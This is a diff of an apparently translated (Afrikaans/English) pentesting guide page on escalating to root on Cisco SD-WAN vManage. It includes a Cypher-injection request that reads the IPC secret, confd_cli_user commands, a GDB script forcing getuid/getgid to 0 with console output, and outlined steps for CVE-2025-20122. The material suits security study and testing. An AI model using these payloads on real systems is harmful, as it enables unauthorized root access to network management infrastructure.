@@ -6,15 +6,15 @@
 
 (Voorbeeld van [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Na 'n bietjie deur sommige [dokumentasie](http://66.218.245.39/doc/html/rn03re18.html) rakende `confd` en die verskillende binaries (toeganklik met 'n rekening op die Cisco-webwerf) te grawe, het ons gevind dat om die IPC-soket te verifieer, dit 'n geheim gebruik wat geleë is in `/etc/confd/confd_ipc_secret`:
+Na 'n bietjie delf in dokumentasie wat verband hou met `confd` en die verskillende binaries (toeganklik met 'n rekening op die Cisco-webwerf), het ons gevind dat dit, om die IPC socket te autentiseer, 'n geheim gebruik wat in `/etc/confd/confd_ipc_secret` geleë is:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Onthou ons Neo4j-instantie? Dit loop onder die `vmanage` gebruiker se voorregte, wat ons in staat stel om die lêer te verkry met behulp van die vorige kwesbaarheid:
+Onthou ons Neo4j-instansie? Dit loop onder die `vmanage` gebruiker se bevoegdhede, wat ons toelaat om die lêer met behulp van die vorige kwesbaarheid te kry:
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Die `confd_cli` program ondersteun nie opdraglynargumente nie, maar roep `/usr/bin/confd_cli_user` met argumente aan. So, ons kan direk `/usr/bin/confd_cli_user` met ons eie stel argumente aanroep. Dit is egter nie leesbaar met ons huidige voorregte nie, so ons moet dit van die rootfs onttrek en dit met scp kopieer, die hulp lees, en dit gebruik om die shell te kry:
+Die `confd_cli`-program ondersteun nie opdragreël-argumente nie, maar roep `/usr/bin/confd_cli_user` met argumente aan. Dus kan ons direk `/usr/bin/confd_cli_user` met ons eie stel argumente aanroep. Dit is egter nie leesbaar met ons huidige regte nie, so ons moet dit vanaf die rootfs haal en met scp kopieer, die help lees, en dit gebruik om die shell te kry:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -44,12 +44,15 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 ## Pad 2
 
-(Voorbeeld van [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Die blog¹ deur die synacktiv span het 'n elegante manier beskryf om 'n root shell te verkry, maar die voorwaarde is dat dit 'n kopie van die `/usr/bin/confd_cli_user` vereis wat slegs deur root leesbaar is. Ek het 'n ander manier gevind om na root te eskaleer sonder sulke moeite.
+Die blog¹ van die synacktiv-span het 'n elegante manier beskryf om 'n root shell te kry, maar die waarskuwing is dat dit vereis om 'n kopie van die `/usr/bin/confd_cli_user` te bekom wat slegs deur root gelees kan word. Ek het 'n ander manier gevind om na root te eskaleer sonder so 'n gedoente.
 
-Toe ek die `/usr/bin/confd_cli` binêre ontleed, het ek die volgende waargeneem:
-```
+Toe ek die binêre `/usr/bin/confd_cli` gedisassembleer het, het ek die volgende opgemerk:
+
+<details>
+<summary>Objdump showing UID/GID collection</summary>
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -77,20 +80,22 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Wanneer ek “ps aux” uitvoer, het ek die volgende opgemerk (_note -g 100 -u 107_)
+</details>
+
+Wanneer ek “ps aux” uitvoer, het ek die volgende opgemerk (_let wel -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ek het hipotese dat die “confd_cli” program die gebruikers-ID en groep-ID wat dit van die ingelogde gebruiker versamel het, aan die “cmdptywrapper” toepassing oorplaas.
+Ek het die hipotese gestel dat die “confd_cli” program die user ID en group ID wat dit van die aangemelde gebruiker versamel, deurgee aan die “cmdptywrapper” toepassing.
 
-My eerste poging was om die “cmdptywrapper” direk te loop en dit te voorsien van `-g 0 -u 0`, maar dit het gefaal. Dit blyk dat 'n lêer beskrywer (-i 1015) êrens langs die pad geskep is en ek kan dit nie naboots nie.
+My eerste poging was om die “cmdptywrapper” direk te hardloop en dit te voorsien van `-g 0 -u 0`, maar dit het misluk. Dit lyk of 'n file descriptor (-i 1015) iewers geskep is en ek kan dit nie nadoen nie.
 
-Soos genoem in synacktiv se blog (laaste voorbeeld), ondersteun die `confd_cli` program nie opdraglyn argumente nie, maar ek kan dit beïnvloed met 'n debugger en gelukkig is GDB ingesluit op die stelsel.
+Soos genoem in synacktiv’s blog (laaste voorbeeld), die `confd_cli` program ondersteun nie command line argumente nie, maar ek kan dit met 'n debugger beïnvloed en gelukkig is GDB op die stelsel ingesluit.
 
-Ek het 'n GDB-skrip geskep waar ek die API `getuid` en `getgid` gedwing het om 0 te retourneer. Aangesien ek reeds “vmanage” regte het deur die deserialisering RCE, het ek toestemming om die `/etc/confd/confd_ipc_secret` direk te lees.
+Ek het 'n GDB-skrip geskep waarin ek die API's `getuid` en `getgid` gedwing het om 0 terug te gee. Aangesien ek reeds “vmanage” privilegie via die deserialization RCE het, het ek toestemming om direk die `/etc/confd/confd_ipc_secret` te lees.
 
 root.gdb:
 ```
@@ -110,8 +115,11 @@ root
 end
 run
 ```
-Konsoluitvoer:
-```
+Konsole-uitset:
+
+<details>
+<summary>Konsole-uitset</summary>
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -144,4 +152,25 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+</details>
+
+## Path 3 (2025 CLI invoer-valideringsfout)
+
+Cisco het vManage hernoem na *Catalyst SD-WAN Manager*, maar die onderliggende CLI hardloop steeds op dieselfde masjien. ’n 2025 advisering (CVE-2025-20122) beskryf onvoldoende invoer-validering in die CLI wat **enige geauthentikeerde plaaslike gebruiker** toelaat om root te kry deur ’n vervaardigde versoek na die manager CLI-diens te stuur. Kombineer enige laag-priv toegang (bv. die Neo4j deserialisering van Path1, of ’n cron/backup gebruiker se shell) met hierdie fout om na root te spring sonder om `confd_cli_user` te kopieer of GDB aan te heg:
+
+1. Gebruik jou laag-priv shell om die CLI IPC-endpunt te vind (tipies die `cmdptywrapper` luisteraar wat op poort 4565 in Path2 getoon word).
+2. Stel ’n CLI-versoek saam wat UID/GID-velde na 0 vervals. Die valideringsfout dwing nie die oorspronklike oproeper se UID af nie, so die wrapper loods ’n root-gedrewe PTY.
+3. Pipe enige command sequence (`vshell; id`) deur die vervalste versoek om ’n root-shell te kry.
+
+> Die exploit-oppervlakte is slegs lokaal; remote code execution is nog steeds nodig om die aanvanklike shell te kry, maar eenmaal binne die masjien is uitbuiting een enkele IPC-bericht eerder as ’n debugger-gebaseerde UID-patch.
+
+## Ander onlangse vManage/Catalyst SD-WAN Manager kwetsbaarhede om in ’n ketting te gebruik
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Injiseer JavaScript in spesifieke koppelvlakvelde; diefstal van ’n admin-sessie gee jou ’n blaaiergedrewe pad na `vshell` → plaaslike shell → Path3 vir root.
+
+## Verwysings
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
